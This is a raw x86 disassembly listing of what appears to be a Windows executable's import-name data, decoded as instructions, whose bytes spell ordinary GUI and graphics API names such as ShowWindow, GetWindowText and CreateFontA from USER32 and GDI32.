  412dbd:	outs   dx,BYTE PTR ds:[esi]
  412dbe:	je     0x412dc0
  412dc0:	bound  eax,QWORD PTR [eax]
  412dc2:	inc    ebx
  412dc3:	jb     0x412e2a
  412dc5:	popa   
  412dc6:	je     0x412e2d
  412dc8:	push   edi
  412dc9:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412dd0:	inc    ecx
  412dd1:	add    BYTE PTR [ecx+0x766e4901],cl
  412dd7:	popa   
  412dd8:	ins    BYTE PTR es:[edi],dx
  412dd9:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  412de1:	je     0x412de3
  412de3:	add    BYTE PTR [ebp+0x2],ch
  412de6:	push   ebx
  412de7:	gs je  0x412e41
  412dea:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412df1:	outs   dx,BYTE PTR ds:[esi]
  412df2:	addr16 inc ecx
  412df4:	add    BYTE PTR [eax],al
  412df6:	adc    eax,0x6c655202
  412dfb:	gs popa 
  412dfd:	jae    0x412e64
  412dff:	inc    esp
  412e00:	inc    ebx
  412e01:	add    BYTE PTR [eax+eax*1],ah
  412e04:	inc    ebx
  412e05:	push   0x65676e61
  412e0a:	dec    ebp
  412e0b:	outs   dx,BYTE PTR gs:[esi]
  412e0d:	jne    0x412e66
  412e0f:	add    BYTE PTR [ebx],bh
  412e11:	add    BYTE PTR [ebx+0x68],al
  412e14:	arpl   WORD PTR gs:[ebx+0x4d],bp
  412e18:	outs   dx,BYTE PTR gs:[esi]
  412e1a:	jne    0x412e65
  412e1c:	je     0x412e83
  412e1e:	ins    DWORD PTR es:[edi],dx
  412e1f:	add    al,ch
  412e21:	add    DWORD PTR [edi+0x70],ecx
  412e24:	outs   dx,BYTE PTR gs:[esi]
  412e26:	dec    ecx
  412e27:	arpl   WORD PTR [edi+0x6e],bp
  412e2a:	add    BYTE PTR [eax],al
  412e2c:	mov    ds:0x57734901,al
  412e31:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  412e38:	imul   esp,DWORD PTR [ebx+0x6f],0xce006564
  412e3f:	add    DWORD PTR [ebp+0x65],ecx
  412e42:	jae    0x412eb7
  412e44:	popa   
  412e45:	addr16 gs inc edx
  412e48:	outs   dx,DWORD PTR ds:[esi]
  412e49:	js     0x412e8c
  412e4b:	add    BYTE PTR [ebp+0x61724400],dh
  412e51:	ja     0x412ea0
  412e53:	outs   dx,BYTE PTR gs:[esi]
  412e55:	jne    0x412e99
  412e57:	popa   
  412e58:	jb     0x412e5a
  412e5a:	inc    edx
  412e5b:	add    dl,BYTE PTR [ebx+0x65]
  412e5e:	je     0x412ea6
  412e60:	outs   dx,DWORD PTR ds:[esi]
  412e61:	jb     0x412ec8
  412e63:	addr16 jb 0x412ed5
  412e66:	jne    0x412ed6
  412e68:	fs push edi
  412e6a:	imul   ebp,DWORD PTR [esi+0x64],0xc200776f
  412e71:	add    dh,BYTE PTR [edi+0x76]
  412e74:	jae    0x412ee6
  412e76:	jb     0x412ee1
  412e78:	outs   dx,BYTE PTR ds:[esi]
  412e79:	je     0x412ee1
  412e7b:	push   edi
  412e7c:	add    BYTE PTR [eax],al
  412e7e:	mov    al,ds:0x57734901
  412e83:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412e8a:	push   ebp
  412e8b:	add    DWORD PTR [edi+0x65],eax
  412e8e:	je     0x412ee3
  412e90:	arpl   WORD PTR [edx+0x6f],si
  412e93:	ins    BYTE PTR es:[edi],dx
  412e94:	ins    BYTE PTR es:[edi],dx
  412e95:	push   eax
  412e96:	outs   dx,DWORD PTR ds:[esi]
  412e97:	jae    0x412e99
  412e99:	add    al,dh
  412e9b:	add    BYTE PTR [edi+0x65],al
  412e9e:	je     0x412ee1
  412ea0:	jae    0x412f1b
  412ea2:	outs   dx,BYTE PTR ds:[esi]
  412ea3:	arpl   WORD PTR [ebx+0x65],cx
  412ea6:	jns    0x412efb
  412ea8:	je     0x412f0b
  412eaa:	je     0x412f11
  412eac:	add    BYTE PTR [eax],al
  412eae:	or     eax,0x74654701
  412eb3:	inc    esp
  412eb4:	imul   esp,DWORD PTR [ecx+0x6c],0x6142676f
  412ebb:	jae    0x412f22
  412ebd:	push   ebp
  412ebe:	outs   dx,BYTE PTR ds:[esi]
  412ebf:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x5502a500
  412ec7:	jo     0x412f2d
  412ec9:	popa   
  412eca:	je     0x412f31
  412ecc:	push   edi
  412ecd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412ed4:	or     eax,DWORD PTR [ecx]
  412ed6:	inc    edi
  412ed7:	gs je  0x412f1e
  412eda:	inc    ebx
  412edb:	inc    ebp
  412edc:	js     0x412ede
  412ede:	stos   DWORD PTR es:[edi],eax
  412edf:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  412ee3:	fs inc ebx
  412ee5:	jne    0x412f59
  412ee7:	jae    0x412f58
  412ee9:	jb     0x412f2c
  412eeb:	add    BYTE PTR [edx+eax*1+0x53],bl
  412eef:	gs je  0x412f45
  412ef2:	arpl   WORD PTR [edx+0x6f],si
  412ef5:	ins    BYTE PTR es:[edi],dx
  412ef6:	ins    BYTE PTR es:[edi],dx
  412ef7:	push   edx
  412ef8:	popa   
  412ef9:	outs   dx,BYTE PTR ds:[esi]
  412efa:	add    BYTE PTR gs:[bx+si],al
  412efe:	cmp    DWORD PTR [eax],eax
  412f00:	inc    ebx
  412f01:	push   0x70557261
  412f06:	jo     0x412f6d
  412f08:	jb     0x412f61
  412f0a:	add    BYTE PTR [eax],al
  412f0c:	fwait
  412f0d:	add    dl,BYTE PTR [ebp+0x6e]
  412f10:	ins    BYTE PTR es:[edi],dx
  412f11:	outs   dx,DWORD PTR ds:[esi]
  412f12:	popa   
  412f13:	fs dec ebx
  412f15:	gs jns 0x412f7a
  412f18:	outs   dx,DWORD PTR ds:[esi]
  412f19:	popa   
  412f1a:	jb     0x412f80
  412f1c:	dec    esp
  412f1d:	popa   
  412f1e:	jns    0x412f8f
  412f20:	jne    0x412f96
  412f22:	add    BYTE PTR [eax],al
  412f24:	push   esi
  412f25:	add    DWORD PTR [edi+0x65],eax
  412f28:	je     0x412f7d
  412f2a:	arpl   WORD PTR [edx+0x6f],si
  412f2d:	ins    BYTE PTR es:[edi],dx
  412f2e:	ins    BYTE PTR es:[edi],dx
  412f2f:	push   edx
  412f30:	popa   
  412f31:	outs   dx,BYTE PTR ds:[esi]
  412f32:	add    BYTE PTR gs:[bx+si],al
  412f36:	ins    DWORD PTR es:[edi],dx
  412f37:	add    DWORD PTR [edi+0x65],eax
  412f3a:	je     0x412f93
  412f3c:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412f43:	outs   dx,BYTE PTR ds:[esi]
  412f44:	addr16 push edi
  412f46:	add    BYTE PTR [eax],al
  412f48:	add    BYTE PTR [ecx],0x49
  412f4b:	outs   dx,BYTE PTR ds:[esi]
  412f4c:	data16 ins BYTE PTR es:[edi],dx
  412f4e:	popa   
  412f4f:	je     0x412fb6
  412f51:	push   edx
  412f52:	arpl   WORD PTR gs:[eax+eax*1+0x16],si
  412f57:	add    dl,BYTE PTR [edx+0x65]
  412f5a:	ins    DWORD PTR es:[edi],dx
  412f5b:	outs   dx,DWORD PTR ds:[esi]
  412f5c:	jbe    0x412fc3
  412f5e:	dec    ebp
  412f5f:	outs   dx,BYTE PTR gs:[esi]
  412f61:	jne    0x412f63
  412f63:	add    BYTE PTR [ebx+0x61724400],ch
  412f69:	ja     0x412fac
  412f6b:	outs   dx,BYTE PTR ds:[esi]
  412f6c:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  412f73:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  412f78:	das    
  412f79:	add    dl,BYTE PTR [ebx+0x65]
  412f7c:	je     0x412fbf
  412f7e:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  412f82:	gs push edi
  412f84:	imul   ebp,DWORD PTR [esi+0x64],0x9c00776f
  412f8b:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412f8f:	ins    BYTE PTR es:[edi],dx
  412f90:	outs   dx,DWORD PTR ds:[esi]
  412f91:	addr16 inc edx
  412f93:	outs   dx,DWORD PTR ds:[esi]
  412f94:	js     0x412fe6
  412f96:	popa   
  412f97:	jb     0x412ffa
  412f99:	ins    DWORD PTR es:[edi],dx
  412f9a:	inc    ecx
  412f9b:	add    bh,ah
  412f9d:	add    BYTE PTR [esi+0x72],al
  412fa0:	popa   
  412fa1:	ins    DWORD PTR es:[edi],dx
  412fa2:	gs push edx
  412fa4:	arpl   WORD PTR gs:[eax+eax*1-0x68],si
  412fa9:	add    DWORD PTR [ecx+0x73],ecx
  412fac:	inc    esp
  412fad:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  412fb4:	jae    0x413029
  412fb6:	popa   
  412fb7:	addr16 gs push edi
  412fba:	add    BYTE PTR [eax],al
  412fbc:	xor    DWORD PTR [eax],eax
  412fbe:	inc    ebx
  412fbf:	push   0x72507261
  412fc4:	gs jbe 0x41301e
  412fc7:	add    BYTE PTR ds:0x74654701,dl
  412fcd:	inc    esi
  412fce:	outs   dx,DWORD PTR ds:[esi]
  412fcf:	jb     0x413036
  412fd1:	addr16 jb 0x413043
  412fd4:	jne    0x413044
  412fd6:	fs push edi
  412fd8:	imul   ebp,DWORD PTR [esi+0x64],0xb700776f
  412fdf:	add    dl,BYTE PTR [edi+0x61]
  412fe2:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x706e4972
  412fea:	jne    0x413060
  412fec:	dec    ecx
  412fed:	fs ins BYTE PTR es:[edi],dx
  412fef:	add    BYTE PTR gs:[eax],al
  412ff2:	push   edi
  412ff3:	add    dl,BYTE PTR [ebx+0x65]
  412ff6:	je     0x413048
  412ff8:	jb     0x413069
  412ffa:	jo     0x413053
  412ffc:	add    BYTE PTR [eax],al
  412ffe:	dec    eax
  412fff:	add    dl,BYTE PTR [ebx+0x65]
  413002:	je     0x413051
  413004:	outs   dx,BYTE PTR gs:[esi]
  413006:	jne    0x413008
  413008:	scas   al,BYTE PTR es:[edi]
  413009:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41300d:	fs inc ebx
  41300f:	jne    0x413083
  413011:	jae    0x413082
  413013:	jb     0x41306c
  413015:	add    BYTE PTR [edi+0x2],bl
  413018:	push   ebx
  413019:	gs je  0x41306f
  41301c:	jns    0x413091
  41301e:	inc    ebx
  41301f:	outs   dx,DWORD PTR ds:[esi]
  413020:	ins    BYTE PTR es:[edi],dx
  413021:	outs   dx,DWORD PTR ds:[esi]
  413022:	jb     0x413097
  413024:	add    BYTE PTR [eax],al
  413026:	xchg   esp,eax
  413027:	add    dl,BYTE PTR [edx+esi*2+0x61]
  41302b:	outs   dx,BYTE PTR ds:[esi]
  41302c:	jae    0x41309a
  41302e:	popa   
  41302f:	je     0x413096
  413031:	inc    ecx
  413032:	arpl   WORD PTR [ebx+0x65],sp
  413035:	ins    BYTE PTR es:[edi],dx
  413036:	gs jb  0x41309a
  413039:	je     0x4130aa
  41303b:	jb     0x413094
  41303d:	add    BYTE PTR [edi+0x66654400],cl
  413043:	push   edi
  413044:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  41304b:	outs   dx,DWORD PTR ds:[esi]
  41304c:	arpl   WORD PTR [edi+0x0],dx
  41304f:	add    BYTE PTR [ecx+0x0],ah
  413052:	inc    ebx
  413053:	jb     0x4130ba
  413055:	popa   
  413056:	je     0x4130bd
  413058:	push   eax
  413059:	outs   dx,DWORD PTR ds:[esi]
  41305a:	jo     0x4130d1
  41305c:	jo     0x4130ab
  41305e:	outs   dx,BYTE PTR gs:[esi]
  413060:	jne    0x413062
  413062:	push   ecx
  413063:	add    dl,BYTE PTR [ebx+0x65]
  413066:	je     0x4130b8
  413068:	popa   
  413069:	jb     0x4130d0
  41306b:	outs   dx,BYTE PTR ds:[esi]
  41306c:	je     0x41306e
  41306e:	popf   
  41306f:	add    BYTE PTR [ecx+ebp*2+0x61],al
  413073:	ins    BYTE PTR es:[edi],dx
  413074:	outs   dx,DWORD PTR ds:[esi]
  413075:	addr16 inc edx
  413077:	outs   dx,DWORD PTR ds:[esi]
  413078:	js     0x4130ca
  41307a:	popa   
  41307b:	jb     0x4130de
  41307d:	ins    DWORD PTR es:[edi],dx
  41307e:	push   edi
  41307f:	add    BYTE PTR [edx+0x6c695402],cl
  413085:	gs push edi
  413087:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41308e:	sub    DWORD PTR [eax],eax
  413090:	inc    ebx
  413091:	push   0x6f4c7261
  413096:	ja     0x4130fd
  413098:	jb     0x4130f1
  41309a:	add    BYTE PTR [eax],al
  41309c:	out    dx,eax
  41309d:	add    DWORD PTR [eax+0x65],edx
  4130a0:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  4130a5:	jae    0x413108
  4130a7:	addr16 gs push edi
  4130aa:	add    BYTE PTR [eax],al
  4130ac:	jne    0x4130af
  4130ae:	inc    edi
  4130af:	gs je  0x413109
  4130b2:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4130b9:	js     0x41312f
  4130bb:	inc    ecx
  4130bc:	add    BYTE PTR [eax],al
  4130be:	add    DWORD PTR ds:[edi+0x65],eax
  4130c2:	je     0x413111
  4130c4:	gs jae 0x41313a
  4130c7:	popa   
  4130c8:	addr16 gs push edi
  4130cb:	add    BYTE PTR ds:0x61684300,ch
  4130d1:	jb     0x413121
  4130d3:	gs js  0x41314a
  4130d6:	push   edi
  4130d7:	add    BYTE PTR [ecx+eax*1+0x64616f4c],bh
  4130de:	push   ebx
  4130df:	je     0x413153
  4130e1:	imul   ebp,DWORD PTR [esi+0x67],0x2800057
  4130e8:	push   ebx
  4130e9:	push   0x6957776f
  4130ee:	outs   dx,BYTE PTR ds:[esi]
  4130ef:	outs   dx,DWORD PTR fs:[esi]
  4130f1:	ja     0x413134
  4130f3:	jae    0x41316e
  4130f5:	outs   dx,BYTE PTR ds:[esi]
  4130f6:	arpl   WORD PTR [eax],ax
  4130f8:	add    BYTE PTR ss:[ebx+0x68],al
  4130fc:	popa   
  4130fd:	jb     0x413154
  4130ff:	jo     0x413171
  413101:	gs jb  0x413145
  413104:	add    BYTE PTR [eax],al
  413106:	sti    
  413107:	add    DWORD PTR [eax+0x74],edx
  41310a:	dec    ecx
  41310b:	outs   dx,BYTE PTR ds:[esi]
  41310c:	push   edx
  41310d:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  413112:	sbb    eax,DWORD PTR [eax]
  413114:	inc    ebx
  413115:	popa   
  413116:	ins    BYTE PTR es:[edi],dx
  413117:	ins    BYTE PTR es:[edi],dx
  413118:	push   edi
  413119:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  413120:	outs   dx,DWORD PTR ds:[esi]
  413121:	arpl   WORD PTR [edi+0x0],dx
  413124:	lahf   
  413125:	add    BYTE PTR [ecx+ebp*2+0x73],al
  413129:	jo     0x41318c
  41312b:	je     0x413190
  41312d:	push   0x7373654d
  413132:	popa   
  413133:	addr16 gs inc ecx
  413136:	add    BYTE PTR [eax],al
  413138:	mov    BYTE PTR [edx],al
  41313a:	push   esp
  41313b:	popa   
  41313c:	bound  esp,QWORD PTR [edx+0x65]
  41313f:	fs push esp
  413141:	gs js  0x4131b8
  413144:	dec    edi
  413145:	jne    0x4131bb
  413147:	push   edi
  413148:	add    BYTE PTR [eax],al
  41314a:	sub    eax,DWORD PTR [edx]
  41314c:	push   ebx
  41314d:	outs   dx,BYTE PTR gs:[esi]
  41314f:	fs dec ebp
  413151:	gs jae 0x4131c7
  413154:	popa   
  413155:	addr16 gs push edi
  413158:	add    BYTE PTR [eax],al
  41315a:	add    DWORD PTR fs:[edi+0x65],eax
  41315e:	je     0x4131b5
  413160:	jo     0x4131c6
  413162:	popa   
  413163:	je     0x4131ca
  413165:	push   edx
  413166:	outs   dx,BYTE PTR ds:[si]
  413168:	add    BYTE PTR [eax],al
  41316a:	mov    eax,0x61724400
  41316f:	ja     0x4131c4
  413171:	je     0x4131d4
  413173:	je     0x4131da
  413175:	push   edi
  413176:	add    BYTE PTR [eax],al
  413178:	sub    eax,0x74654701
  41317d:	dec    ebp
  41317e:	outs   dx,BYTE PTR gs:[esi]
  413180:	jne    0x4131c5
  413182:	push   0x4d6b6365
  413187:	popa   
  413188:	jb     0x4131f5
  41318a:	inc    esp
  41318b:	imul   ebp,DWORD PTR [ebp+0x65],0x6f69736e
  413192:	outs   dx,BYTE PTR ds:[esi]
  413193:	jae    0x413195
  413195:	add    BYTE PTR [ebx+0x616f4c01],bh
  41319b:	fs push ebx
  41319d:	je     0x413211
  41319f:	imul   ebp,DWORD PTR [esi+0x67],0x2590041
  4131a6:	push   ebx
  4131a7:	gs je  0x4131fc
  4131aa:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  4131af:	jo     0x413225
  4131b1:	jns    0x4131b3
  4131b3:	add    BYTE PTR [edi+0x0],dl
  4131b6:	inc    ebx
  4131b7:	jb     0x41321e
  4131b9:	popa   
  4131ba:	je     0x413221
  4131bc:	inc    esp
  4131bd:	imul   esp,DWORD PTR [ecx+0x6c],0x6e49676f
  4131c4:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  4131cc:	jb     0x41322f
  4131ce:	ins    DWORD PTR es:[edi],dx
  4131cf:	push   edi
  4131d0:	add    BYTE PTR [eax],al
  4131d2:	cmp    BYTE PTR [eax],al
  4131d4:	inc    ebx
  4131d5:	push   0x70557261
  4131da:	jo     0x413241
  4131dc:	jb     0x413220
  4131de:	jne    0x413246
  4131e0:	push   di
  4131e2:	add    BYTE PTR [eax],al
  4131e4:	ja     0x4131e7
  4131e6:	inc    edi
  4131e7:	gs je  0x413241
  4131ea:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4131f1:	js     0x413267
  4131f3:	dec    esp
  4131f4:	outs   dx,BYTE PTR gs:[esi]
  4131f6:	addr16 je 0x413261
  4131f9:	push   edi
  4131fa:	add    BYTE PTR [eax],al
  4131fc:	xor    eax,0x61684300
  413201:	jb     0x413257
  413203:	outs   dx,DWORD PTR ds:[esi]
  413204:	dec    edi
  413205:	gs ins DWORD PTR es:[edi],dx
  413207:	push   edi
  413208:	add    BYTE PTR [eax],al
  41320a:	dec    edx
  41320b:	add    dl,BYTE PTR [ebx+0x65]
  41320e:	je     0x41325d
  413210:	outs   dx,BYTE PTR gs:[esi]
  413212:	jne    0x413258
  413214:	gs popaw 
  413217:	jne    0x413285
  413219:	je     0x413264
  41321b:	je     0x413282
  41321d:	ins    DWORD PTR es:[edi],dx
  41321e:	add    BYTE PTR [eax],al
  413220:	push   ebp
  413221:	push   ebx
  413222:	inc    ebp
  413223:	push   edx
  413224:	xor    esi,DWORD PTR [edx]
  413226:	cs fs ins BYTE PTR es:[edi],dx
  413229:	ins    BYTE PTR es:[edi],dx
  41322a:	add    BYTE PTR [eax],al
  41322c:	push   ebx
  41322d:	add    BYTE PTR [ecx+0x6d],cl
  413230:	popa   
  413231:	addr16 gs dec esp
  413234:	imul   esi,DWORD PTR [ebx+0x74],0x7465535f
  41323b:	dec    ecx
  41323c:	arpl   WORD PTR [edi+0x6e],bp
  41323f:	push   ebx
  413240:	imul   edi,DWORD PTR [edx+0x65],0x49005600
  413247:	ins    DWORD PTR es:[edi],dx
  413248:	popa   
  413249:	addr16 gs dec esp
  41324c:	imul   esi,DWORD PTR [ebx+0x74],0x6972575f
  413253:	je     0x4132ba
  413255:	add    BYTE PTR [esi+0x0],cl
  413258:	dec    ecx
  413259:	ins    DWORD PTR es:[edi],dx
  41325a:	popa   
  41325b:	addr16 gs dec esp
  41325e:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  413265:	ins    BYTE PTR es:[edi],dx
  413266:	popa   
  413267:	arpl   WORD PTR [ebp+0x49],sp
  41326a:	arpl   WORD PTR [edi+0x6e],bp
  41326d:	add    BYTE PTR [esi],dh
  41326f:	add    BYTE PTR [ecx+0x6d],cl
  413272:	popa   
  413273:	addr16 gs dec esp
  413276:	imul   esi,DWORD PTR [ebx+0x74],0x6172445f
  41327d:	ja     0x41327f
  41327f:	add    BYTE PTR [ebx],dl
  413281:	add    BYTE PTR [ebx+0x72],al
  413284:	gs popa 
  413286:	je     0x4132ed
  413288:	push   eax
  413289:	jb     0x4132fa
  41328b:	jo     0x4132f2
  41328d:	jb     0x413303
  41328f:	jns    0x4132e4
  413291:	push   0x50746565
  413296:	popa   
  413297:	addr16 gs push edi
  41329a:	add    BYTE PTR [eax],al
  41329c:	pop    esp
  41329d:	add    BYTE PTR [eax+0x72],dl
  4132a0:	outs   dx,DWORD PTR ds:[esi]
  4132a1:	jo     0x413308
  4132a3:	jb     0x413319
  4132a5:	jns    0x4132fa
  4132a7:	push   0x57746565
  4132ac:	add    BYTE PTR [eax],al
  4132ae:	inc    ebx
  4132af:	dec    edi
  4132b0:	dec    ebp
  4132b1:	inc    ebx
  4132b2:	push   esp
  4132b3:	dec    esp
  4132b4:	xor    esi,DWORD PTR [edx]
  4132b6:	cs fs ins BYTE PTR es:[edi],dx
  4132b9:	ins    BYTE PTR es:[edi],dx
  4132ba:	add    BYTE PTR [eax],al
  4132bc:	mov    WORD PTR [eax],es
  4132be:	inc    ebx
  4132bf:	jb     0x413326
  4132c1:	popa   
  4132c2:	je     0x413329
  4132c4:	inc    ebx
  4132c5:	outs   dx,DWORD PTR ds:[esi]
  4132c6:	ins    DWORD PTR es:[edi],dx
  4132c7:	jo     0x41332a
  4132c9:	je     0x413334
  4132cb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  4132cf:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xa5000070
  4132d7:	add    BYTE PTR [ebx+0x72],al
  4132da:	gs popa 
  4132dc:	je     0x413343
  4132de:	push   eax
  4132df:	popa   
  4132e0:	ins    BYTE PTR es:[edi],dx
  4132e1:	gs je  0x413358
  4132e4:	add    BYTE PTR gs:[ebx+0x746e4901],dl
  4132eb:	gs jb  0x413361
  4132ee:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  4132f3:	imul   esi,DWORD PTR [eax+0x52],0x746365
  4132fa:	into   
  4132fb:	add    DWORD PTR [ebx+0x65],edx
  4132fe:	ins    BYTE PTR es:[edi],dx
  4132ff:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  413304:	push   0x65
  413306:	arpl   WORD PTR [eax+eax*1+0x0],si
  41330a:	jp     0x41330d
  41330c:	inc    edi
  41330d:	gs je  0x413363
  413310:	jns    0x413385
  413312:	je     0x413379
  413314:	ins    DWORD PTR es:[edi],dx
  413315:	push   eax
  413316:	popa   
  413317:	ins    BYTE PTR es:[edi],dx
  413318:	gs je  0x41338f
  41331b:	gs push ebp
  41331d:	jae    0x413384
  41331f:	add    BYTE PTR [ecx+0x65724300],cl
  413325:	popa   
  413326:	je     0x41338d
  413328:	inc    edx
  413329:	jb     0x4133a0
  41332b:	jae    0x413395
  41332d:	dec    ecx
  41332e:	outs   dx,BYTE PTR ds:[esi]
  41332f:	imul   esi,DWORD PTR fs:[edx+0x65],0xe8007463
  413337:	add    DWORD PTR [ebx+0x65],edx
  41333a:	je     0x413389
  41333c:	popa   
  41333d:	jo     0x41338c
  41333f:	outs   dx,DWORD PTR ds:[esi]
  413340:	fs add BYTE PTR gs:[eax],al
  413344:	pop    esp
  413345:	add    DWORD PTR [edi+0x65],eax
  413348:	je     0x413396
  41334a:	popa   
  41334b:	jns    0x4133bc
  41334d:	jne    0x4133c3
  41334f:	add    bh,ch
  413351:	add    DWORD PTR [ebx+0x65],edx
  413354:	je     0x4133a6
  413356:	imul   edi,DWORD PTR [eax+0x65],0xc700006c
  41335d:	add    DWORD PTR [ebx+0x61],edx
  413360:	jbe    0x4133c7
  413362:	inc    esp
  413363:	inc    ebx
  413364:	add    BYTE PTR [eax],al
  413366:	pop    edi
  413367:	add    DWORD PTR [edi+0x65],eax
  41336a:	je     0x4133b9
  41336c:	popa   
  41336d:	jo     0x4133bc
  41336f:	outs   dx,DWORD PTR ds:[esi]
  413370:	fs add BYTE PTR gs:[eax],al
  413374:	mov    ds:0x65724300,al
  413379:	popa   
  41337a:	je     0x4133e1
  41337c:	dec    ecx
  41337d:	inc    ebx
  41337e:	push   edi
  41337f:	add    BYTE PTR [esi+0x65724300],dl
  413385:	popa   
  413386:	je     0x4133ed
  413388:	inc    ebp
  413389:	ins    BYTE PTR es:[edi],dx
  41338a:	ins    BYTE PTR es:[edi],dx
  41338b:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  413392:	outs   dx,BYTE PTR ds:[esi]
  413393:	dec    ecx
  413394:	outs   dx,BYTE PTR ds:[esi]
  413395:	imul   esi,DWORD PTR fs:[edx+0x65],0x99007463
  41339d:	add    BYTE PTR [ebx+0x72],al
  4133a0:	gs popa 
  4133a2:	je     0x413409
  4133a4:	inc    esi
  4133a5:	outs   dx,DWORD PTR ds:[esi]
  4133a6:	outs   dx,BYTE PTR ds:[esi]
  4133a7:	je     0x4133ea
  4133a9:	add    BYTE PTR ds:0x61725402,cl
  4133af:	outs   dx,BYTE PTR ds:[esi]
  4133b0:	jae    0x41341e
  4133b2:	popa   
  4133b3:	je     0x41341a
  4133b5:	inc    ebx
  4133b6:	push   0x65737261
  4133bb:	je     0x413406
  4133bd:	outs   dx,BYTE PTR ds:[esi]
  4133be:	outs   dx,WORD PTR ds:[esi]
  4133c0:	add    BYTE PTR [eax],al
  4133c2:	out    dx,al
  4133c3:	add    DWORD PTR [ebx+0x65],edx
  4133c6:	je     0x413418
  4133c8:	popa   
  4133c9:	ins    BYTE PTR es:[edi],dx
  4133ca:	gs je  0x413441
  4133cd:	gs inc ebp
  4133cf:	outs   dx,BYTE PTR ds:[esi]
  4133d0:	je     0x413444
  4133d2:	imul   esp,DWORD PTR [ebp+0x73],0x5301d300
  4133d9:	gs je  0x41341e
  4133dc:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x6d694470
  4133e4:	outs   dx,BYTE PTR gs:[esi]
  4133e6:	jae    0x413451
  4133e8:	outs   dx,DWORD PTR ds:[esi]
  4133e9:	outs   dx,BYTE PTR ds:[esi]
  4133ea:	inc    ebp
  4133eb:	js     0x4133ed
  4133ed:	add    BYTE PTR [esi],al
  4133ef:	add    dl,BYTE PTR [ebx+0x74]
  4133f2:	jb     0x413459
  4133f4:	je     0x413459
  4133f6:	push   0x746c42
  4133fb:	add    BYTE PTR [eax+eax*1+0x61657243],dl
  413402:	je     0x413469
  413404:	inc    esp
  413405:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  41340c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  413410:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x13f0070
  413418:	inc    edi
  413419:	gs je  0x413460
  41341c:	dec    ecx
  41341d:	inc    edx
  41341e:	inc    ebx
  41341f:	outs   dx,DWORD PTR ds:[esi]
  413420:	ins    BYTE PTR es:[edi],dx
  413421:	outs   dx,DWORD PTR ds:[esi]
  413422:	jb     0x413478
  413424:	popa   
  413425:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  413429:	add    BYTE PTR [edi+0x6e694c01],dl
  41342f:	gs push esp
  413431:	outs   dx,DWORD PTR ds:[esi]
  413432:	add    BYTE PTR [eax],al
  413434:	clc    
  413435:	add    DWORD PTR [ebx+0x65],edx
  413438:	je     0x41348e
  41343a:	gs js  0x4134b1
  41343d:	inc    ecx
  41343e:	ins    BYTE PTR es:[edi],dx
  41343f:	imul   esp,DWORD PTR [edi+0x6e],0x1a40000
  413446:	push   eax
  413447:	popa   
  413448:	je     0x41348c
  41344a:	ins    BYTE PTR es:[edi],dx
  41344b:	je     0x41344d
  41344d:	add    BYTE PTR [ebp+0x0],dh
  413450:	inc    edx
  413451:	imul   ebp,DWORD PTR gs:[bp+0x50],0x687461
  41345a:	test   al,0x0
  41345c:	inc    ebx
  41345d:	jb     0x4134c4
  41345f:	popa   
  413460:	je     0x4134c7
  413462:	push   eax
  413463:	outs   dx,BYTE PTR gs:[esi]
  413465:	dec    ecx
  413466:	outs   dx,BYTE PTR ds:[esi]
  413467:	imul   esi,DWORD PTR fs:[edx+0x65],0x83007463
  41346f:	add    DWORD PTR [edi+0x65],eax
  413472:	je     0x4134c8
  413474:	gs js  0x4134eb
  413477:	inc    ebp
  413478:	js     0x4134ee
  41347a:	outs   dx,BYTE PTR gs:[esi]
  41347c:	je     0x4134ce
  41347e:	outs   dx,DWORD PTR ds:[esi]
  41347f:	imul   ebp,DWORD PTR [esi+0x74],0x413233
  413486:	aam    0x1
  413488:	push   ebx
  413489:	gs je  0x4134ce
  41348c:	imul   eax,DWORD PTR [ebx+0x6f],0x6c
  413490:	outs   dx,DWORD PTR ds:[esi]
  413491:	jb     0x413493
  413493:	add    bl,dh
  413495:	add    DWORD PTR [ebx+0x65],edx
  413498:	je     0x4134ec
  41349a:	dec    edi
  41349b:	push   eax
  41349c:	xor    al,BYTE PTR [eax]
  41349e:	stos   BYTE PTR es:[edi],al
  41349f:	add    BYTE PTR [ebx+0x72],al
  4134a2:	gs popa 
  4134a4:	je     0x41350b
  4134a6:	push   eax
  4134a7:	outs   dx,DWORD PTR ds:[esi]
  4134a8:	ins    BYTE PTR es:[edi],dx
  4134a9:	jns    0x413512
  4134ab:	outs   dx,DWORD PTR ds:[esi]
  4134ac:	outs   dx,BYTE PTR ds:[esi]
  4134ad:	push   edx
  4134ae:	outs   dx,BYTE PTR ds:[si]
  4134b0:	add    BYTE PTR [eax],al
  4134b2:	xchg   DWORD PTR [ecx],eax
  4134b4:	inc    edi
